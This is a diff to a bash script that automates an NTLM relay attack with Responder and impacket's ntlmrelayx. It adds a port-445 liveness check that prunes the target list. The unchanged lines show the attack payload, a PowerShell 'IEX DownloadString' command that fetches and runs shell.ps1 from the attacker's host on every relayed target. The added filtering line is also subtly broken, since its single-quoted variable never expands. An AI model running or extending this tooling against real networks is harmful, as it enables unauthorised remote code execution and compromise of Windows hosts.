@@ -157,6 +157,20 @@ function checkProgramsNeeded(){
 
 }
 
+function checkTargets(){
+	
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking targets...\n"; sleep 0.5; fi
+	
+	while read line; do 
+		portStatus=$(nc -nvzq $line 445 |& awk '{print $5}')
+		if [ $portStatus != 'open' ];then
+			if [ ! -z $quiet ];then echo -e "${yellowColour}[:S]${endColour} Target $line is not alive or has the SMB service disable. Removing from targets...\n"; sleep 0.5; fi
+			grep -v '$line' $targets > $(pwd)/impacket/targets.txt
+		fi
+	done < $targets
+		
+}
+
 function checkResponderConfig(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking responder config..."; fi
@@ -232,7 +246,6 @@ function relayingAttack(){
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
 	
 	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
-	cp $targets $(pwd)/impacket/targets.txt
 	let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
@@ -366,6 +379,7 @@ if [ "$(id -u)" == 0 ]; then
 		fi
 
 		checkProgramsNeeded
+		checkTargets
 		checkResponderConfig
 		relayingAttack
 	fi
